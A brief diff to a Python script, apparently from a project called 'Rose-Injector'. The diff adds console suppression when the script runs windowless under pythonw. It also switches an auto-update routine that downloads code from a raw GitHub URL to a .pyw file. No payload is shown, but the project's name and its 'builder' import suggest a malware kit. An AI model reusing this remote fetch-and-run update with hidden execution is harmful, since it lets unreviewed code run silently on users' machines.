@@ -1,3 +1,8 @@
+import sys, os
+if sys.executable.endswith('pythonw.exe'):
+    sys.stdout = open(os.devnull, 'w')
+    sys.stderr = open(os.path.join(os.getenv('TEMP'), 'stderr-{}'.format(os.path.basename(sys.argv[0]))), "w")
+    
 import psocials
 import builder
 
@@ -44,7 +49,7 @@ def auto_update():
         return 
     
     _code = (
-            "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/roseui/v8.py"
+            "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/roseui/v8.pyw"
     )
     
     code = requests.get(_code, timeout=10).text
